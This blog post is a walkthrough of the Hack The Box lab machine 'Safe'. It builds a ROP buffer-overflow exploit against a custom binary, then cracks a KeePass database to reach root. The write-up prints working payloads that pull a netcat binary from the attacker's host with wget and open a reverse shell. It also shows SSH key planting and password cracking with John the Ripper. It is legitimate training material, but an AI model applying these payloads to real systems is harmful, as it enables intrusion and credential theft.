---
layout:     post
title:      HacktheBox - Personal 'Safe' Walkthough 
title2:      Hack the Box - Safe
date:       2019-10-26 10:00:00 -0400
summary:    HTB Safe machine walkthrough. A contentious box from HTB requiring a custom developed ROP (return-oriented programming) exploit tied into cracking a KeepPass database.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb 
 - walkthrough
 - writeup
 - buffer-overflow
 - rop
 - keeppass
 - john-the-ripper
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-safe/infocard.PNG' | relative_url }}">
</p>

<p>Marked as easy, Safe is a contentious box from HTB requiring a custom developed ROP (return-oriented programming) exploit tied into cracking a KeepPass database. Personally I absolutely loved the box from the perspective of digging into ROP and practicing the techniques. The box itself however was quite barren and could have definitely used a bit more "makeup" to get away from the CTF-like vibes. If you have a base in <a href="{{ site.baseurl }}{% link _posts/2019-10-12-htb-machine-writeup.md %}">binary exploitation</a> but haven't dived into ROP exploits before this is a great box to make that jump. The <a href="{{ site.baseurl }}{% link _posts/2019-10-19-htb-machine-ellingson.md %}">Ellingson</a> box was then a good next-step as it took the same ROP concepts and required use of ret2lib which wasn't required here.</p>

<h1>Initial Recon</h1>

<p>Per normal kicking off the recon phase with an <code>nmap</code> query.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Safe# nmap -sS -Pn -p1- -sV -sC --open -v 10.10.10.147
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-13 14:27 EDT
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     14:28:48 up 1:13, 0 users, load average: 0.01, 0.03, 0.05
|   DNSVersionBindReqTCP: 
|     14:28:43 up 1:13, 0 users, load average: 0.02, 0.03, 0.06
|   GenericLines: 
|     14:28:32 up 1:12, 0 users, load average: 0.02, 0.03, 0.06
|     What do you want me to echo back?
|   GetRequest: 
|     14:28:38 up 1:12, 0 users, load average: 0.02, 0.03, 0.06
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     14:28:38 up 1:12, 0 users, load average: 0.02, 0.03, 0.06
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     14:28:53 up 1:13, 0 users, load average: 0.01, 0.02, 0.05
|     What do you want me to echo back? HELP
|   Kerberos, SSLSessionReq, TLSSessionReq: 
|     14:28:53 up 1:13, 0 users, load average: 0.01, 0.02, 0.05
|     What do you want me to echo back?
|   NULL: 
|     14:28:32 up 1:12, 0 users, load average: 0.02, 0.03, 0.06
|   RPCCheck: 
|     14:28:38 up 1:12, 0 users, load average: 0.02, 0.03, 0.06
|   RTSPRequest: 
|     14:28:38 up 1:12, 0 users, load average: 0.02, 0.03, 0.06
|_    What do you want me to echo back? OPTIONS / RTSP/1.0
1 service unrecognized despite returning data.
{% endhighlight %}

<p>Already this seems interesting with port 1337. What happens when we go to the page manually</p>

<p align="center">
<img src="{{ '/assets/htb-safe/echo-back.PNG' | relative_url }}">
</p>

<p>Hum...that output seems suspciously like the output of <code>uptime</code>. So this should mean that at somepoint during the call it's executing the command and returning the result. Let's see if we can fuzz this quick and dirty.</p>

<p align="center">
<img src="{{ '/assets/htb-safe/myapp-fuzz.PNG' | relative_url }}">
</p>

<p>So when passing 120 characters to the call it still prints out the uptime result, however seemingly the execution flow afterwards breaks.</p>

<p>I spent a bit of time attempting different inputs however all I was able to glean was the difference with >=120 characters. Decided to go back to the drawing board and look at port 80. Looks like just a default apache page - nothing special here. Or is there...</p>

<p align="center">
<img src="{{ '/assets/htb-safe/myapp.PNG' | relative_url }}">
</p>

<p>Sneaky... I went to <code>http://10.10.10.147/myapp</code> and grabed a copy of the myapp program. Great now it's definitely looking more like a RE/Binex based challenge.</p>

<h1>User exploitation</h1>

<p>First thing I do is open up Ghidra to try and go through the source code decompile. The program itself seems quite simplistic.</p>

<p align="center">
<img src="{{ '/assets/htb-safe/ghidra-main-decom.PNG' | relative_url }}">
</p>

<p>Now that we understand the logic flow let's replicate the overflow with a debugger attached and see what we can find. While we're at it let's also take a quick look at the security settings of the app.</p>

<p align="center">
<img src="{{ '/assets/htb-safe/gdb-checksec-simple.PNG' | relative_url }}">
</p>
<p align="center">
<img src="{{ '/assets/htb-safe/gdb-a-fuzz.PNG' | relative_url }}">
</p>

<p>With NX set we know we won't be able to push our own code to the Stack and have it executed so we will need to look for a different avenue. Continuing with the execution flow we can see that we completely overwrite <code>$rbp</code>. A quick look online gives a good breakdown on various register purposes - <i><code>%rbp</code> points to the current stack frame, <code>%rsp</code> points to the top of the stack</i>. With our ability to overwrite <code>%rbp</code> we should be able to leverage that to hijack execution flow. Let's get a bit more details using pattern create.</p>

<p align="center">
<img src="{{ '/assets/htb-safe/gdb-pattern-fuzz.PNG' | relative_url }}">
</p>

{% highlight shell %}
$rsp   : 0x00007fffffffe188  →  "Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af[...]"
$rbp   : 0x3964413864413764 ("d7Ad8Ad9"?)

root@kali:~/Desktop/HTB/Safe# /usr/bin/msf-pattern_offset -q 0x3964413864413764
[*] Exact match at offset 112

root@kali:~/Desktop/HTB/Safe# /usr/bin/msf-pattern_offset -q Ae0A
[*] Exact match at offset 120
{% endhighlight %}

<p>Ok so the first 112 bytes are garbage that fills up the <code>gets()</code> array, the next 8 bytes will overwrite <code>$rbp</code> and from 120 on looks like we're overwriting the stack.</p>

<h3>Enter the ROP</h3>

<p>Firstly, what is ROP? Good old wikipedia to the rescue.</p>

<blockquote>
In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.
</blockquote>

<p>Essentially we are trying to pass memory addresses to the stack that when sequentially executed will perform actions we want. At the end of the execution flow of <code>myapp</code> there is a leave/ret combo.</p>

{% highlight shell %}
     0x4011ab <main+76>        leave  
     0x4011ac <main+77>        ret   
{% endhighlight %}

<p>Looking deeper into code theory I found that with <a href="https://www.felixcloutier.com/x86/leave">leave</a> - <i>"...the old frame pointer is then popped from the stack..."</i> and <a href="https://www.felixcloutier.com/x86/ret">ret</a> - <i>"Transfers program control to a return address located on the top of the stack"</i>. Since we have control of the stack we should be able leverage this to load the stack with function addresses we want to execute. Thankfully there is a <code>system()</code> call directly in the main function. We won't have to use any advanced techniques, we only need to reference the address of the function directly - <code>0x0040116e</code>. Padding the address appropriately for 64 bit, let's give it a shot and check in the debugger.</p>

{% highlight python %}
python -c 'print "A"*120 + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"C"*100' > specific5.txt
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-safe/gdb-system-rop2.PNG' | relative_url }}">
</p>

<p>Excellent. We see the <code>system()</code> call at the top of the stack and our breakpoint at myapp's <code>return 0;</code> show's the execution flow is being redirected to <code>system()</code> instead of exiting. Now this in itself wasn't particularly useful. I wanted to see how <code>/usr/bin/uptime</code> was being passed to the call. I set up a breakpoint on the initial call and compared between this one and my forced call at the end.</p>

{% highlight shell %}
Initial system call:
system@plt (
   $rdi = 0x0000000000402008 → "/usr/bin/uptime",
   $rsi = 0x00007fffffffe268 → 0x00007fffffffe549 → "/root/Desktop/HTB/Safe/myapp"
)

My system call:
system@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x0000000000405260 → "What do you want me to echo back? AAAAAAAAAAAAAAAA[...]"
)
{% endhighlight %}

<p>Alright, so I need to find a gadget that can overwrite <code>$rdi</code> to something of my choosing. Going back to the ghidra decompile I found a handy function built in to the app. Despite <code>test()</code> never being called, it does provide us the appropriate gadgets necessary to update <code>$rdi</code>.</p>

{% highlight shell %}
**************************************************************
*                          FUNCTION                          *
**************************************************************
undefined test()
     undefined         AL:1           <RETURN>
     test                                            XREF[3]:     Entry Point(*), 00402060, 
                                                                                  00402108(*)  
00401152 55              PUSH       RBP
00401153 48 89 e5        MOV        RBP,RSP
00401156 48 89 e7        MOV        RDI,RSP
00401159 41 ff e5        JMP        R13
{% endhighlight %}

<p>Now there is one extra complication here. While <code>test()</code>moves the value of <code>$rsp</code> into <code>$rdi</code> like we need, it then jumps to the value of <code>$r13</code> which is currently/will be empty at the moment. We need to chain this call with another gadget that also pops an address off the stack (which we control) into <code>$r13</code>. GDB has a nice ropper function for this exact purpose.</p>

<p align="center">
<img src="{{ '/assets/htb-safe/gdb-ropper.PNG' | relative_url }}">
</p>

<p>Ok so there are three pops as part of this gadget. We need to take that into consideration and include fluff to ensure we get the right address into <code>r13</code> and the rest our stack isn't adversely affected. Thinking about this logically we want to form the exploit as follows:</p>

{% highlight python %}
"A"*120 +                             #fluff until the start of stack
"\x06\x12\x40\x00\x00\x00\x00\x00" +  # pop r13; pop r14; pop r15; ret;
"\x6e\x11\x40\x00\x00\x00\x00\x00" +  #system() - r13
"\x6e\x11\x40\x00\x00\x00\x00\x00" +  #system() - r14
"\x6e\x11\x40\x00\x00\x00\x00\x00" +  #system() - r15
"\x52\x11\x40\x00\x00\x00\x00\x00" +  # test()
"/bin/sh " +                          #command we want to execute 
"C"*100                               #rest of fluff
{% endhighlight %}

<p>Ok, let's put it together and see how it goes:</p>

{% highlight python %}
python -c 'print"A"*120 + 
"\x06\x12\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x52\x11\x40\x00\x00\x00\x00\x00" + 
"/bin/sh " + "C"*100' > custom5.txt
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-safe/custom5.PNG' | relative_url }}">
</p>

<p>Wait a minute, that doesn't look right... It seems when attempting to execute it is pulling the first 8 characters before the stack in addition to what is on the stack. Essentially bytes 112-120, or what we overwrite into <code>$rbp</code>. Ok we can work with that. Let's adjust the exploit.</p>

{% highlight python %}
python -c 'print "A"*112 + "/bin/sh " + 
"\x06\x12\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x52\x11\x40\x00\x00\x00\x00\x00" + 
"/bin/sh " + "C"*100' > custom6.txt
{% endhighlight %}

<p>This also didn't work. But knowing where to look we took a look at our <code>system()</code> call and see what <code>$rdi</code> looks like.</p>

{% highlight shell %}
system@plt (
   $rdi = 0x00007fffffffe1a8 → "/bin/sh /bin/sh CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]",
   $rsi = 0x0000000000405260 → "What do you want me to echo back? AAAAAAAAAAAAAAAA[...]"
)
{% endhighlight %}

<p>Ok, we are calling <code>/bin/sh</code> properly. Now we need to replace that second instance with the command we want to run and also terminate the command to avoid chaining the rest of the stack. I forgot to terminate on the next attempt, however that irrelevant as I managed to get my test command executed! At this point I was over the moon.</p>

{% highlight python %}
python -c 'print "A"*112 + "/bin/sh;" + 
"\x06\x12\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x52\x11\x40\x00\x00\x00\x00\x00" + 
"/bin/sh whoami" + "C"*100' > custom9.txt
{% endhighlight %}

{% highlight shell %}
root@kali:~/Desktop/HTB/Safe# cat custom9.txt | ./myapp 
 20:47:27 up  6:24,  1 user,  load average: 0.19, 0.19, 0.18

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh;@
root
sh: 1: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC: not found

What do you want me to echo back? �G�^
Segmentation fault
{% endhighlight %}

<p>With some tweaking I was ready give it a shot with the actual <code>myapp</code> instead of my local variant. With baited breath I pressed enter and hoped for the best.</p>

{% highlight python %}
python -c 'print "A"*112 + "/bin/sh|" + 
"\x06\x12\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x52\x11\x40\x00\x00\x00\x00\x00" + 
"cat /home/user/user.txt;" + "C"*100' > custom13.txt
{% endhighlight %}
{% highlight shell %}
root@kali:~/Desktop/HTB/Safe# cat custom13.txt | nc 10.10.10.147 1337
 21:20:13 up  2:26,  1 user,  load average: 0.00, 0.01, 0.00
7a29e*********************
{% endhighlight %}

<p> *Happy dance* while not a shell, I was able to cross user flag off the list. With my moment of joy subsiding, let's see how we can use this.</p>

<p>At this point, I essentially have single-command RCE. There are quite a few different ways I could do this. My initial thought was adding my ssh keys to authorized_keys. For whatever reason I couldn't get it to work with the single command RCE. Up next, I attempted to execute a <code>nc</code> back to my local listener, but it seemed like it (among a lot of other common binaries) was not installed. No worries, let's get a static version of <code>nc</code> and host it on our machine, then point our RCE to <code>wget</code> it.</p>

{% highlight python %}
python -c 'print "A"*112 + "/bin/sh|" + 
"\x06\x12\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x52\x11\x40\x00\x00\x00\x00\x00" + 
"wget -P /home/user http://10.10.15.xxx/nc;" + 
"C"*100' > custom13.txt
{% endhighlight %}

{% highlight shell %}
cat custom13.txt | nc 10.10.10.147 1337
 21:53:02 up  2:59,  1 user,  load average: 0.00, 0.03, 0.00
--2019-10-13 21:53:02--  http://10.10.15.xxx/nc
Connecting to 10.10.15.xxx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 959800 (937K)
Saving to: ‘/home/user/nc’

     0K .......... .......... .......... .......... ..........  5% 1.28M 1s
    50K .......... .......... .......... .......... .......... 10% 3.71M 0s
   100K .......... .......... .......... .......... .......... 16% 3.20M 0s
   150K .......... .......... .......... .......... .......... 21% 8.72M 0s
   200K .......... .......... .......... .......... .......... 26% 7.80M 0s
   250K .......... .......... .......... .......... .......... 32% 6.51M 0s
   300K .......... .......... .......... .......... .......... 37% 4.55M 0s
   350K .......... .......... .......... .......... .......... 42% 2.78M 0s
   400K .......... .......... .......... .......... .......... 48% 4.13M 0s
   450K .......... .......... .......... .......... .......... 53% 5.26M 0s
   500K .......... .......... .......... .......... .......... 58% 5.75M 0s
   550K .......... .......... .......... .......... .......... 64% 4.37M 0s
   600K .......... .......... .......... .......... .......... 69% 4.64M 0s
   650K .......... .......... .......... .......... .......... 74% 4.73M 0s
   700K .......... .......... .......... .......... .......... 80% 4.79M 0s
   750K .......... .......... .......... .......... .......... 85% 8.24M 0s
   800K .......... .......... .......... .......... .......... 90% 6.02M 0s
   850K .......... .......... .......... .......... .......... 96% 5.90M 0s
   900K .......... .......... .......... .......              100% 8.67M=0.2s

2019-10-13 21:53:02 (4.31 MB/s) - ‘/home/user/nc’ saved [959800/959800]
{% endhighlight %}

<p>I then repeated the command setting it to executable with <code>chmod +x /home/user/nc</code>. With my local listener setup, I format the command to connect back to me.</p>

{% highlight python %}
python -c 'print "A"*112 + "/bin/sh|" + 
"\x06\x12\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x6e\x11\x40\x00\x00\x00\x00\x00" + 
"\x52\x11\x40\x00\x00\x00\x00\x00" + 
"/home/user/nc -e /bin/sh 10.10.15.xxx 1337;" + 
"C"*100' > custom13.txt
{% endhighlight %}

{% highlight shell %}
root@kali:~/Desktop/HTB/Safe# cat custom13.txt | nc 10.10.10.147 1337
 21:54:58 up  3:01,  1 user,  load average: 0.00, 0.01, 0.00
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-safe/usershell1.PNG' | relative_url }}">
</p>

<p>Now that there is a limited shell, let's add the ssh keys and connect back properly.</p>

{% highlight shell %}
echo "ssh-rsa AAAAB3NzaC1yc2EA.....OR1FcXBuOItl root@kali" > authorized_keys
{% endhighlight %}

{% highlight shell %}
root@kali:~/Desktop/HTB/Safe# ssh user@10.10.10.147
Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 13 20:03:13 2019 from 10.10.14.38
user@safe:~$ pwd
/home/user
user@safe:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
{% endhighlight %}

<p>Bam. Ok what a ride. It's not over yet though, we still have root to conquer.</p>

<h1>Root exploitation</h1>

<p>Unfortunately root was not as exciting as user. I did however still learn a thing or two going through the process. With our proper user shell I take a look around and notice a .kdbx file along with 6 JPG files. Let's move those over to our machine for further analysis.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Safe/roots# scp user@10.10.10.147:/home/user/IMG* .
IMG_0545.JPG                                  100% 1863KB   5.0MB/s   00:00    
IMG_0546.JPG                                  100% 1872KB   4.3MB/s   00:00    
IMG_0547.JPG                                  100% 2470KB   3.4MB/s   00:00    
IMG_0548.JPG                                  100% 2858KB   3.6MB/s   00:00    
IMG_0552.JPG                                  100% 1099KB   3.4MB/s   00:00    
IMG_0553.JPG                                  100% 1060KB   3.8MB/s   00:00    

root@kali:~/Desktop/HTB/Safe/roots# scp user@10.10.10.147:/home/user/My* .
MyPasswords.kdbx                              100% 2446   121.7KB/s   00:00    
{% endhighlight %}

<p>After a bit of searching around find out that .kdbx is a Keeppass database file. <a href="https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c">This article</a> gave me a bit of background in how to use JTR to crack the database. After going through the full <code>rockyou.txt</code> wordlist it didn't seem like I had this right. A little deeper searching and I found <a href="https://stackoverflow.com/questions/45788336/produce-a-hash-from-keepass-with-keyfile">this article</a> that explained how Keeppass databases can also be locked using a keyfile. Considering we have 6 different JPG files this seems like an interesting angle. Using the various JPGs used <code>keepass2john</code> to generate the hash and pass it along to JTR. After a few attempts - victory!<p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Safe/roots# keepass2john -k IMG_0547.JPG MyPasswords.kdbx > jcrack.hash
root@kali:~/Desktop/HTB/Safe/roots# cat jcrack.hash 
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7

root@kali:~/Desktop/HTB/Safe/roots# john jcrack.hash --wordlist ~/Desktop/rockyou.txt --format=KeePass
..
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
...
bullshit         (MyPasswords)
Session completed
{% endhighlight %}

<p>Well that's a password alright. Let's get install <code>kpcli</code> and take a poke at what we can see.</p>

{% highlight shell %}
kpcli:/> import MyPasswords.kdbx . IMG_0547.JPG
Please provide the master password: *************************
kpcli:/> ls
=== Groups ===
eMail/
Internet/
./
{% endhighlight %}

<p>Unfortunately both eMail and Internet were empty. Ok I wonder what else I can do with <code>kpcli</code>.</p>

{% highlight shell %}
kpcli:/> stats
File:               
Key file: N/A
KeePass file version: 
Encryption type:      
Encryption rounds:    
Number of groups:     11
Number of entries:    3
Entries with passwords of length:
  -  1-7: 1
  - 8-11: 1
  -  20+: 1

kpcli:/.> find pass
Searching for "pass" ...
 - 1 matches found and placed into /_found/
Would you like to show this entry? [y/N] 

 Path: /./MyPasswords/
Title: Root password
Uname: root
 Pass: ****************************
  URL: 
Notes: 
{% endhighlight %}

<p>Oooohhh amazing! Ok so we dumped the "root" password into <code>_found</code>. 

{% highlight shell %}
kpcli:/.> cd _found/
kpcli:/_found> ls
=== Entries ===
1. Root password                                                          
kpcli:/_found> show -f 0

 Path: /./MyPasswords/
Title: Root password
Uname: root
 Pass: u3v22*******************
  URL: 
Notes: 
{% endhighlight %}

<p>Now this wasn't the flag itself, so let's try and pivot to root using the <code>kpcli</code> password as root's password.<p>

<p align="center">
<img src="{{ '/assets/htb-safe/root.PNG' | relative_url }}">
</p>

<p>And just like that, Safe is in the book.</p>

<p>Thanks folks. Until next time.</p>